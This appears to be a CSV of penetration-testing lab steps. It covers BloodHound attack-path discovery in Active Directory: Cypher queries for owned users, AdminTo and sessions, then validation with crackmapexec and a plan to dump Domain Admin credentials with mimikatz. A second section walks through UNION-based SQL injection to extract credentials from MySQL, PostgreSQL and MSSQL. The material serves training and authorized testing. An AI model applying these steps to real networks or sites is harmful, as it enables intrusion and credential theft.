"id","name","objective","description","expected_output","notes"
"mark-owned-users","Mark All Compromised Users as Owned","Mark all compromised domain users as 'owned' in BloodHound to enable owned-principal queries","Mark every compromised user account as owned in BloodHound GUI. This is CRITICAL because pre-built queries filter for paths FROM owned principals.

Process:
1. Open BloodHound GUI
2. Use search bar to find first compromised user (type username)
3. Right-click user node → 'Mark User as Owned'
4. Verify: User icon shows red skull icon
5. Repeat for ALL compromised users (pete, mike, dave, etc.)

Why This Matters:
- Pre-built query 'Shortest Paths to Domain Admins from Owned Principals' ONLY shows paths from marked users
- If you forget to mark a user as owned, their paths won't appear in queries
- Marking multiple users increases chances of finding attack path

Expected State:
- All compromised users show red skull icon in BloodHound
- Node info panel shows 'Owned: Yes'
- Pre-built queries now include these users in results

Troubleshooting:
- Can't find user: Check username format (should be 'user@domain.com' lowercase)
- Multiple users with same name: Check SID or full distinguished name
- Mark doesn't persist: BloodHound database may not be writable (check Neo4j permissions)
- User not in database: Re-run BloodHound collection, ensure user exists in domain

CLI Alternative (if GUI unavailable):
Using cypher-shell:
```
MATCH (u:User {name:'PETE@CORP.LOCAL'}) SET u.owned=true RETURN u.name
```

Batch marking (if many users):
```
MATCH (u:User) WHERE u.name IN ['PETE@CORP.LOCAL', 'MIKE@CORP.LOCAL', 'DAVE@CORP.LOCAL'] SET u.owned=true RETURN u.name
```

Verification:
Run query to list all owned users:
```
MATCH (u:User {owned:true}) RETURN u.name
```

Common Mistake:
Marking only FIRST compromised user. The writeup shows: pete had NO paths, but mike (also compromised) had AdminTo on CLIENT75. Test ALL users.","",""
"run-prebuilt-queries","Run Pre-Built Queries and Document Results","Execute BloodHound pre-built queries to establish baseline before moving to custom queries","Run BloodHound's pre-built queries to check for obvious attack paths. When these fail (return 'No paths found'), this validates the need for custom Cypher queries.

Pre-Built Queries to Run:

1. 'Shortest Paths to Domain Admins from Owned Principals'
   - Analysis tab → Pre-Built Queries → Pathfinding
   - Click query name to execute
   - Expected result: Graph showing paths OR 'No paths found'

2. 'Shortest Paths to High Value Targets from Owned Principals'
   - Broader than Domain Admins (includes Enterprise Admins, other groups)
   - May find paths even if DA query fails

3. 'Find Computers where Domain Users are Local Admin'
   - Shows systems with over-privileged access
   - Filter results for owned users

4. 'List all Owned Principals'
   - Verification query: confirms all users marked correctly
   - Should show pete, mike, dave, etc.

Documenting Results:
- 'No paths found': Proceed to custom Cypher queries (expected scenario)
- Paths found: Document path, validate it's exploitable, execute attack
- Partial results: Some users have paths, others don't (iterate with custom queries)

CRITICAL UNDERSTANDING:
'No paths found' from pre-built queries does NOT mean:
- No attack path exists
- You should give up on BloodHound
- Lateral movement is impossible

It DOES mean:
- No DIRECT path from owned users to Domain Admins
- Need to find INDIRECT paths via intermediate systems/users
- Time to use custom Cypher queries

Query Execution Tips:
- Wait 5-10 seconds for large domains (thousands of users)
- If query hangs, check Neo4j CPU usage (may need optimization)
- Graph view can be zoomed (scroll wheel) and panned (drag)
- Node info: Click any node to see properties, relationships, permissions

Expected Timeline:
- Small domain (<100 users): Queries run in 1-2 seconds
- Medium domain (100-1000 users): 5-10 seconds per query
- Large domain (>1000 users): May need query optimization or timeout adjustment

Troubleshooting:
- All queries return empty: Check if users actually marked as owned (step 1)
- Query timeout: Increase Neo4j timeout in BloodHound settings
- Can't find Analysis tab: Check BloodHound version (v4+ has different UI)
- Graph too complex: Use filters to hide low-value nodes","",""
"enumerate-adminto","Enumerate AdminTo Relationships for Each User","Use custom Cypher to find all systems where compromised users have local admin privileges","Run custom Cypher query to enumerate AdminTo relationships for each compromised user. This identifies lateral movement opportunities.

Custom Cypher Query:
```
MATCH (u:User {name:'PETE@CORP.LOCAL'})-[:AdminTo]->(c:Computer)
RETURN u.name, c.name
```

Execution Process:
1. Open BloodHound GUI
2. Click 'Raw Query' field at top (or query icon)
3. Paste query with first compromised user
4. Replace 'PETE@CORP.LOCAL' with actual username (UPPERCASE, with @DOMAIN)
5. Press Enter or click Execute
6. Review results in graph view and table view
7. Repeat for ALL compromised users

Expected Results:
- List of systems where user has local admin
- Graph showing user → AdminTo → computer relationships
- System hostnames with domain suffix (CLIENT75.CORP.LOCAL)

Example Output:
```
u.name              | c.name
--------------------|----------------------
PETE@CORP.LOCAL     | (no results)
MIKE@CORP.LOCAL     | CLIENT75.CORP.LOCAL
DAVE@CORP.LOCAL     | WORKSTATION10.CORP.LOCAL
```

Interpretation:
- Pete: No AdminTo relationships (dead end for this user)
- Mike: AdminTo on CLIENT75 (LATERAL MOVEMENT OPPORTUNITY)
- Dave: AdminTo on WORKSTATION10 (LATERAL MOVEMENT OPPORTUNITY)

Next Steps After Finding AdminTo:
1. Document all AdminTo relationships
2. Prioritize: Servers > Workstations (more likely to have valuable sessions)
3. Check for HasSession relationships on these systems (step 4)
4. Plan lateral movement using evil-winrm, PSExec, or WMI

Advanced Query (All Users at Once):
```
MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)
RETURN u.name, c.name
```

This shows AdminTo for ALL owned users in one query. Faster but may be overwhelming with many results.

Query Variants:

Count AdminTo relationships:
```
MATCH (u:User {name:'MIKE@CORP.LOCAL'})-[:AdminTo]->(c:Computer)
RETURN u.name, count(c) as admin_count
```

Filter for specific computer types:
```
MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)
WHERE c.operatingsystem CONTAINS 'Server'
RETURN u.name, c.name, c.operatingsystem
```

Troubleshooting:
- No results for any user: Check username format (must be 'USER@DOMAIN.COM')
- 'Invalid property' error: User not in database, check collection
- Too many results: Filter by OS, last logon, or other properties
- Can't copy query: Type manually, ensure quotes are correct (single quotes for strings)

CRITICAL: Don't stop after first user with no AdminTo. Iterate through ALL users. The writeup shows pete had nothing, but mike had CLIENT75.","",""
"check-sessions","Check for High-Value Sessions on Accessible Systems","Query for Domain Admin sessions on systems where compromised users have AdminTo access","Use custom Cypher to check if systems (where you have AdminTo) have Domain Admin sessions cached. This identifies credential harvesting opportunities.

Custom Cypher Query:
```
MATCH (c:Computer {name:'CLIENT75.CORP.LOCAL'})<-[:HasSession]-(u:User)
RETURN c.name, u.name, u.enabled
```

Execution Process:
1. Take list of systems from step 3 (where you have AdminTo)
2. For EACH system, run query to check sessions
3. Replace 'CLIENT75.CORP.LOCAL' with actual system name
4. Look for Domain Admin accounts in results
5. Verify user is enabled (u.enabled = true)

Expected Results:
```
c.name                   | u.name                    | u.enabled
-------------------------|---------------------------|----------
CLIENT75.CORP.LOCAL      | ADMINISTRATOR@CORP.LOCAL  | true
CLIENT75.CORP.LOCAL      | WORKSTATION_USER@CORP.LOCAL | true
```

Interpretation:
- ADMINISTRATOR session on CLIENT75: JACKPOT! This is Domain Admin
- WORKSTATION_USER session: Standard user, less valuable
- Focus on: Administrator, svc_admin, any account with 'admin' in name

Verify Domain Admin Membership:
Custom query to check if user is Domain Admin:
```
MATCH (u:User {name:'ADMINISTRATOR@CORP.LOCAL'})-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
RETURN u.name, g.name
```

If query returns results: User IS Domain Admin
If query returns empty: User is not Domain Admin, check other groups

Advanced Query (All Sessions on Accessible Systems):
```
MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)
MATCH (c)<-[:HasSession]-(u2:User)
WHERE u2.enabled = true
RETURN u.name as owned_user, c.name as system, u2.name as session_user
```

This finds ALL sessions on ALL systems where owned users have AdminTo. Faster for multiple systems.

Prioritization:
1. Domain Admins: Highest priority (instant domain compromise)
2. Enterprise Admins: Even higher privileges (multi-domain access)
3. Service accounts: Often reused passwords, lateral movement
4. IT/helpdesk accounts: Over-privileged, may have access to sensitive systems

Query Variants:

Filter for admin-like names:
```
MATCH (c:Computer {name:'CLIENT75.CORP.LOCAL'})<-[:HasSession]-(u:User)
WHERE u.name CONTAINS 'ADMIN' OR u.name CONTAINS 'SVC'
RETURN c.name, u.name
```

Check session count:
```
MATCH (c:Computer {name:'CLIENT75.CORP.LOCAL'})<-[:HasSession]-(u:User)
RETURN c.name, count(u) as session_count
```

Troubleshooting:
- No sessions found: System may be offline, check last logon time
- Only computer accounts: No user sessions cached, target different system
- Can't verify DA membership: Check group name format ('DOMAIN ADMINS@DOMAIN.COM')
- Too many sessions: Filter for enabled=true and admin-like names

CRITICAL SUCCESS: Found CLIENT75 has ADMINISTRATOR session + mike has AdminTo on CLIENT75 = Attack Path!
Next: Lateral movement to CLIENT75 → credential harvest → domain compromise","",""
"validate-attack-path","Validate and Document Attack Path","Verify the discovered attack path is exploitable and document complete chain","Validate that the discovered attack path is actually exploitable before executing the attack. This prevents wasting time on broken paths.

Attack Path Format:
Compromised User → AdminTo → System → HasSession → Domain Admin

Example from Corp-DCSync Writeup:
MIKE@CORP.LOCAL → AdminTo → CLIENT75 → HasSession → ADMINISTRATOR@CORP.LOCAL

Validation Checklist:

1. Compromised User Access:
   - Confirm you have credentials for mike (password or hash)
   - Test authentication: crackmapexec smb <any_system> -u mike -p <password>
   - Verify mike is marked as owned in BloodHound

2. AdminTo Relationship:
   - Confirm mike has local admin on CLIENT75
   - Test access: crackmapexec smb CLIENT75 -u mike -p <password>
   - Look for 'Pwn3d!' indicator (confirms local admin)

3. System Accessibility:
   - Confirm CLIENT75 is online: ping CLIENT75.CORP.LOCAL
   - Check WinRM port: nmap -p 5985,5986 CLIENT75.CORP.LOCAL
   - Check SMB port: nmap -p 445 CLIENT75.CORP.LOCAL

4. Session Validity:
   - BloodHound data may be stale (hours/days old)
   - Administrator session MIGHT have logged out
   - Service sessions more reliable (persist until reboot)
   - Validation: Execute attack, check mimikatz output for session

5. Domain Admin Verification:
   - Confirm ADMINISTRATOR is actually Domain Admin
   - Command: net group ""Domain Admins"" /domain (from any domain system)
   - Look for Administrator in member list

Documenting Attack Path:

Text Format:
```
Attack Path Discovered:
- Owned User: mike@corp.local (credentials: mike:Password123!)
- AdminTo: CLIENT75.CORP.LOCAL (validated with crackmapexec Pwn3d!)
- HasSession: administrator@corp.local (Domain Admin confirmed)
- Attack Vector: Lateral movement to CLIENT75 → mimikatz credential dump → extract DA hash → domain compromise
- Estimated Time: 15 minutes
- Prerequisites: None (mike credentials sufficient)
```

Visual Format (Graph Export):
1. In BloodHound, run custom query to show full path:
```
MATCH p=(u:User {name:'MIKE@CORP.LOCAL'})-[:AdminTo]->(c:Computer)<-[:HasSession]-(admin:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
RETURN p
```
2. Export graph: Right-click → Export Graph → PNG
3. Save for documentation

Alternative Paths:
If primary path fails validation:
- Check OTHER compromised users (dave, pete) for different paths
- Check OTHER systems where mike has AdminTo
- Look for group membership paths (MemberOf relationships)
- Consider Kerberoasting or AS-REP roasting as alternatives

Common Validation Failures:
- System offline: Target different system from AdminTo list
- Session stale: Proceed anyway, check mimikatz output for current sessions
- No WinRM: Use PSExec or WMI for lateral movement
- Account disabled: Verify with 'net user <username> /domain'

Success Criteria:
- All 5 validation checks pass
- Attack path documented completely
- Ready to execute: lateral movement → credential harvest → escalation","",""
"detect-sqli","Detect SQL Injection Vulnerability","Confirm parameter is vulnerable to SQL injection using error-based technique","Test parameter with single quote payload. Look for database error messages revealing backend type (MySQL, PostgreSQL, MSSQL).","",""
"enum-columns","Enumerate Column Count","Determine number of columns in SQL query using ORDER BY technique","Increment ORDER BY value (ORDER BY 1, ORDER BY 2, ...) until error occurs. Last successful value equals column count. CRITICAL: UNION SELECT requires exact column count match.","",""
"test-union","Test UNION SELECT Injection","Verify UNION injection works and identify which columns are displayed on page","Use UNION SELECT with NULL values matching column count. Replace NULLs with test strings ('test1', 'test2') to identify displayed column positions.","",""
"identify-database","Identify Database Type and Version","Extract database type, version, current database name, and user","Use database-specific functions in displayed columns: MySQL (version(), database(), user()), PostgreSQL (version(), current_database(), current_user), MSSQL (@@version, DB_NAME(), USER_NAME()). This step determines which branch to follow.","",""
"enum-mysql-tables","Enumerate MySQL Tables","Extract table names from MySQL information_schema","Query information_schema.tables to get all table names in current database. Filter out system databases (mysql, information_schema). Focus on tables containing 'user', 'admin', 'credential' keywords.","",""
"enum-postgres-tables","Enumerate PostgreSQL Tables","Extract table names from PostgreSQL pg_catalog or information_schema","Query information_schema.tables or pg_catalog.pg_tables for table names in public schema. Use PostgreSQL concatenation operator (||) instead of CONCAT.","",""
"enum-mssql-tables","Enumerate MSSQL Tables","Extract table names from MSSQL system views","Query sys.tables or information_schema.tables for table names in current database. Use MSSQL + concatenation operator instead of ||.","",""
"extract-mysql-data","Extract MySQL Credentials","Dump username and password columns from identified tables","Use UNION SELECT to extract data from users/admin tables. Use CONCAT or GROUP_CONCAT to combine multiple rows. Target username and password columns.","",""
"extract-postgres-data","Extract PostgreSQL Credentials","Dump credentials from PostgreSQL tables","Extract username and password columns using PostgreSQL concatenation (||) operator. Use ::text casting if needed for type compatibility.","",""
"extract-mssql-data","Extract MSSQL Credentials","Dump credentials from MSSQL tables","Extract data using MSSQL + concatenation operator and CAST for type conversion. Target username and password columns in identified tables.","",""
"verify-admin-access","Verify Admin Access with CrackMapExec","Confirm credentials grant local administrator access before attempting lateral movement","Use CrackMapExec to test SMB authentication and verify admin rights (Pwn3d! indicator).

This prevents wasting time on failed exploitation attempts.","",""
